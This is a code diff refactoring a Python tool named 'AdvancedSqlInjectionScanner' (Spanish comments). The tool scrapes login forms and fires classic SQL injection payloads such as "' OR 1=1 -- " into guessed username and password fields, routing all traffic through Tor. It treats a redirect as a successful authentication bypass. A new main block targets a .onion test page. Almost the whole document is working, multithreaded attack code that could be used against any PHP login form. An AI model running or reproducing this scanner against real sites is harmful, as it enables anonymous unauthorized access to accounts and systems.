@@ -2,7 +2,7 @@ import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urljoin
 from concurrent.futures import ThreadPoolExecutor, as_completed
-
+import json
 
 class AdvancedSqlInjectionScanner:
     def __init__(self, proxy_address="127.0.0.1", proxy_port=9050):
@@ -13,45 +13,29 @@ class AdvancedSqlInjectionScanner:
         }
 
     def get_forms(self, url):
+        forms_info = []
         try:
             response = self.session.get(url, proxies=self.proxies, allow_redirects=True)
             response.raise_for_status()
             soup = BeautifulSoup(response.content, "html.parser")
             forms = soup.find_all("form")
             for form in forms:
-                # Encontrar todos los elementos de entrada (input) dentro de cada formulario
+                inputs_info = []
                 inputs = form.find_all('input')
-
-                # Iterar sobre los inputs e imprimir los nombres
                 for input_tag in inputs:
+                    input_info = {}
                     nombre = input_tag.get('name')
                     if nombre:
-                        print("Nombre del input:", nombre)
-            return soup.find_all("form")
+                        input_info['name'] = nombre
+                        inputs_info.append(input_info)
+                forms_info.append({
+                    'action': form.attrs.get("action"),
+                    'inputs': inputs_info
+                })
+            return forms_info
         except requests.exceptions.RequestException as e:
             print(f"Error al acceder a {url}: {e}")
-            return []
-
-    def form_details(self, form):
-        details_of_form = {}
-        action = form.attrs.get("action")
-        method = form.attrs.get("method", "get")
-        inputs = []
-
-        for input_tag in form.find_all("input"):
-            input_type = input_tag.attrs.get("type", "text")
-            input_name = input_tag.attrs.get("name")
-            input_value = input_tag.attrs.get("value", "")
-            inputs.append({
-                "type": input_type,
-                "name": input_name,
-                "value": input_value,
-            })
-
-        details_of_form['action'] = action
-        details_of_form['method'] = method
-        details_of_form['inputs'] = inputs
-        return details_of_form
+            return {'error': str(e)}
 
     def vulnerable(self, response):
         # Lista de posibles mensajes de error o éxito relacionados con SQL
@@ -94,12 +78,8 @@ class AdvancedSqlInjectionScanner:
                 return True
         return False
 
-
-    def inject_sql(self, url, action, method, headers):
-        # Obtén la URL actual antes de la inyección
+    def inject_sql(self, url, action, headers):
         current_url = self.session.get(url).url
-
-        # Modificar la consulta SQL aquí
         sql_payloads = [
             "' OR 1=1 -- ",
             "' OR 'a'='a",
@@ -115,12 +95,12 @@ class AdvancedSqlInjectionScanner:
         ]
 
         username_payloads = [
+            "usernam",
             "uname",
             "username",
             "user",
             "usr",
-            "name",
-            "usernam"
+            "name"
         ]
 
         password_payloads = [
@@ -130,39 +110,26 @@ class AdvancedSqlInjectionScanner:
             "pwd",
         ]
 
+        vulnerable_forms = []
+        errors = []
+
         def send_request(username_payload, password_payload, sql_payload):
             payload = {username_payload: sql_payload, password_payload: '1234'}
 
-            if method == "post":
+            try:
                 res = self.session.post(urljoin(url, action), data=payload,
                                         headers=headers, proxies=self.proxies, allow_redirects=True)
-            elif method == "get":
-                res = self.session.get(urljoin(url, action), params=payload,
-                                    headers=headers, proxies=self.proxies, allow_redirects=True)
 
-            # Imprime la URL y datos de la solicitud para depurar
-            #print(f"[+] Solicitud de inyección SQL ({url}):")
-            #print(f"Payload enviado: {payload}")
+                res.raise_for_status()
 
-            res.raise_for_status()
-            #print("#####################" + str(res.text) + " for " + str(url))
-            #print(f"Contenido de la respuesta: {res.content.decode()}")
+                if self.vulnerable(res) and res.url != current_url:
+                    new_url = res.url
+                    if current_url != new_url: # si la URL cambió, entonces es vulnerable (redirección)
+                        vulnerable_forms.append({'url': new_url, 'payload': payload})
+                        return
 
-            # Verifica si hay una vulnerabilidad
-            if self.vulnerable(res) and res.url != current_url:
-                print(f'Posible vulnerabilidad SQL detectada con payload: {payload}')
-
-                # Obtiene la nueva URL después de la inyección
-                new_url = res.url
-                
-                # Compara las URLs para verificar el redireccionamiento
-                if current_url != new_url:
-                    print(f'La página se ha redirigido a: {new_url}')
-                    exit()
-                    # Puedes manejar el redireccionamiento aquí
-                return res  # Devuelve la respuesta
-
-            #print(f'La consulta SQL con payload {payload} no tuvo éxito.')
+            except Exception as e:
+                errors.append(str(e))
 
         with ThreadPoolExecutor(max_workers=10) as executor:
             futures = []
@@ -172,41 +139,41 @@ class AdvancedSqlInjectionScanner:
                         futures.append(executor.submit(send_request, username_payload, password_payload, sql_payload))
 
             for future in as_completed(futures):
-                res = future.result()
-                # Aquí puedes manejar la respuesta de cada solicitud
+                future.result()
 
-        # Si no se encontró ninguna vulnerabilidad
-        #print(f'La inyección SQL no tuvo éxito con los payloads proporcionados.')
-        return True
-
+        return {'vulnerable_forms': vulnerable_forms, 'errors': errors}
 
     def sql_injection_scan(self, urls):
-        # Itera sobre las URLs obtenidas por el Crawler
+        results = {}
         for url in urls:
             try:
-                # Conecta a través de Tor
                 self.session.proxies = {
                     'http': 'socks5h://localhost:9050',
                     'https': 'socks5h://localhost:9050'
                 }
 
-                # Obtén formularios y detalles
-                forms = self.get_forms(url)
-                print(f"[+] Detectados {len(forms)} formularios en {url}.")
+                forms_info = self.get_forms(url)
+                print(f"[+] Detectados {len(forms_info)} formularios en {url}.")
 
-                # Itera sobre los formularios
-                for form in forms:
-                    details = self.form_details(form)
+                for form_info in forms_info:
+                    action = form_info.get("action")
+                    if action and (".php" in url or ".php" in action):
+                        result = self.inject_sql(url, action, {'User-Agent': 'pentest'})
+                        results = {'url': url, 'forms_info': forms_info, 'sql_injection_result': result}
 
-                    # Si la acción del formulario contiene ".php"
-                    if ".php" in url or ".php" in details["action"]:
-                        # Llama a la función inject_sql
-                        if self.inject_sql(url, details["action"], details["method"], {'User-Agent': 'pentest'}):
-                            # Si encuentra una inyección SQL exitosa, termina el escaneo para esta URL
-                            break
-
-                
             except Exception as e:
                 print(f"Error durante el escaneo de inyección SQL para {url}: {e}")
+                results = {'url': url, 'error': str(e)}
 
-    
+        return results
+
+if __name__ == "__main__":
+    urls = [
+        "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_sqli/prueba_sqli.html"
+    ]
+
+    sql_scanner = AdvancedSqlInjectionScanner()
+    results = sql_scanner.sql_injection_scan(urls)
+
+    # Imprimir resultados en formato JSON
+    print(json.dumps(results, indent=4))
